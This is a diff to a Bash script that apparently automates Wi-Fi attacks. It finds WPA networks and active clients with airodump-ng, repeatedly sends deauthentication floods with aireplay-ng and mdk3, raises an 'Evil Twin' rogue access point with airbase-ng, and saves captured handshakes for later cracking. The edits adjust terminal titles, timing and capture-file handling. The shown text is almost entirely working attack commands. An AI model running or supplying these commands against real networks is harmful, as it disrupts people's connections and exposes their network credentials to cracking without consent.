@@ -320,10 +320,10 @@ fclientscan()															#Find active clients
 		then
 			if [ $NIC2 -z ] 2> /dev/null
 				then
-					gnome-terminal -t "$MON1 Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
 				else
-					gnome-terminal -t "$MON1 Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
-					gnome-terminal -t "$MON2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
+					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+					gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
 			fi
 		else
 			case $CIPHER in
@@ -335,7 +335,7 @@ fclientscan()															#Find active clients
 				"WPA2")BARG='-Z '
 			esac
 			PART1=${RANDOM:0:2}
-			gnome-terminal -t "$MON1 Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+			gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
 	fi
 	
 	while [ $CLIENT -z ] 2> /dev/null
@@ -375,7 +375,7 @@ fbotstart()																#Startup Autobot
 	echo $BLU" [>]$GRN AUTOBOT ENGAGED$BLU [<] "
 	echo
 	echo " [*]$GRN Scanning$BLU for new active clients.. ";$COLOR2 9
-	gnome-terminal -t "$MON1 Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+	gnome-terminal -t "$NIC Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
 	DONE=""
 	PWRCHK=1;RESETCNT=1;MNUM=0;LNUM=0
 	GOT=$(cat $OUTDIR/got);echo "$GOT" | sort -u > $OUTDIR/got
@@ -392,7 +392,7 @@ fautobot()																#Automagically find new target clients
 			killall airodump-ng
 			sleep 0.7
 			rm -rf $HOME/tmp*
-			gnome-terminal -t "$MON1 Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t "$NIC Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
 			MNUM=0
 			LNUM=0
 			RESETCNT=1
@@ -514,10 +514,10 @@ fautobot()																#Automagically find new target clients
 				then
 					if [ $NIC2 -z ] 2> /dev/null
 						then
-							gnome-terminal -t "$MON1 Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+							gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+320 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
 						else
-							gnome-terminal -t "$MON1 Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
-							gnome-terminal -t "$MON2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
+							gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+							gnome-terminal -t "$NIC2 Sniping $ESSID" --geometry=100x20+0+600 -x airodump-ng $MON2 --bssid $BSSID -c $CHAN -w $HOME/tmpe&
 					fi
 				else
 					case $CIPHER in
@@ -529,7 +529,7 @@ fautobot()																#Automagically find new target clients
 						"WPA2")BARG='-Z '
 					esac
 					PART1=${RANDOM:0:2}
-					gnome-terminal -t "$MON1 Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
+					gnome-terminal -t "$NIC Sniping $ESSID" --geometry=100x20+0+200 -x airodump-ng $MON1 --bssid $BSSID -c $CHAN -w $HOME/tmp&
 			fi
 			fautocap
 	fi
@@ -583,6 +583,10 @@ fautocap()																#Deauth targets and collect handshakes
 			echo -e $RED" [*] Target ESSID:\t\t $GRN$ESSID$RED\t\t Loaded [*] "
 			echo -e $RED" [*] Target Client No.$GRN$DISPNUM:\t $CLIENT$RED\t Loaded [*]"$RST
 			sleep 0.7
+			if [ $TARGETS -z ] 2> /dev/null
+				then
+					TARGETS=$CLIENT
+			fi
 			if [ $NIC2 -z ] 2> /dev/null
 				then
 					echo $BLU;echo " [>] FIRE! [<] "
@@ -593,13 +597,14 @@ fautocap()																#Deauth targets and collect handshakes
 								do
 									MACNUM=$((MACNUM + 1))
 									echo $GRN" [*] Client number $MACNUM: $CLIENT"
-									sleep 2.2 && killall aireplay-ng 2> /dev/null&
+									sleep 1.8 && killall aireplay-ng 2> /dev/null&
 									echo $BLU;aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1;echo $RST
+									sleep 1
 								done
 							sleep 3
 						else
 							echo $BSSID > $HOME/BSSIDB
-							gnome-terminal -t "MDK3 on $MON1" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
+							gnome-terminal -t "MDK3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
 							sleep 3 && killall mdk3 2> /dev/null&
 							sleep 6
 					fi
@@ -615,13 +620,14 @@ fautocap()																#Deauth targets and collect handshakes
 										do
 											MACNUM=$((MACNUM + 1))
 											echo $GRN" [*] Client number $MACNUM: $CLIENT"
-											sleep 3.3 && killall aireplay-ng 2> /dev/null&
+											sleep 2.8 && killall aireplay-ng 2> /dev/null&
 											echo $BLU;aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2;echo $RST
+											sleep 1
 										done
 									sleep 3
 								else
 									echo $BSSID > $HOME/BSSIDB
-									gnome-terminal -t "MDK3 on $MON2" --geometry=60x20+720+320 -x mdk3 $MON2 d -b $HOME/BSSIDB&
+									gnome-terminal -t "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -b $HOME/BSSIDB&
 									sleep 3 && killall mdk3 2> /dev/null&
 									sleep 6
 							fi
@@ -630,14 +636,14 @@ fautocap()																#Deauth targets and collect handshakes
 								then
 									CHKBASE=1
 							fi
-							echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched" 
-							echo $BLU;echo " [>] FIRE ON $NIC2! [<] "
+							echo;echo $RED" [*]$GRN Evil Twin $ESSID$RED Launched on $GRN$NIC2" 
+							echo $BLU;echo " [>] FIRE ON $NIC! [<] "
 							echo $BLU
-							sleep 2.2 && killall aireplay-ng 2> /dev/null&
+							sleep 1.8 && killall aireplay-ng 2> /dev/null&
 							aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep segeg&
 							echo $RED" [*] $GRN Deauth$RED Launched"
 							sleep 1
-							gnome-terminal -t "Evil Twin $ESSID listening.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $BSSID -i $MON2 -I 50 -F $HOME/tmpe $MON2&
+							gnome-terminal -t "Evil Twin $ESSID listening on $NIC2.." --geometry=100x20+0+600 -x airbase-ng -v -c $CHAN -e $ESSID -W 1 $BARG$CIPHER -a $BSSID -i $MON2 -I 50 -F $HOME/tmpe $MON2&
 							sleep 1
 							echo;sleep 8
 					fi
@@ -721,6 +727,10 @@ fautocap()																#Deauth targets and collect handshakes
 					echo " [*] Handshake saved to$BLU $OUTDIR/$ESSID-$DATE.cap$GRN [*] "
 			fi
 		else
+			if [ $EDONE = 1 ] 2> /dev/null
+				then
+					cp $HOME/tmpe-01.cap $HOME/tmp-01.cap
+			fi
 			echo " [*] Handshake saved to$BLU $OUTDIR/$ESSID-$DATE.cap$GRN [*] "
 	fi
 	echo
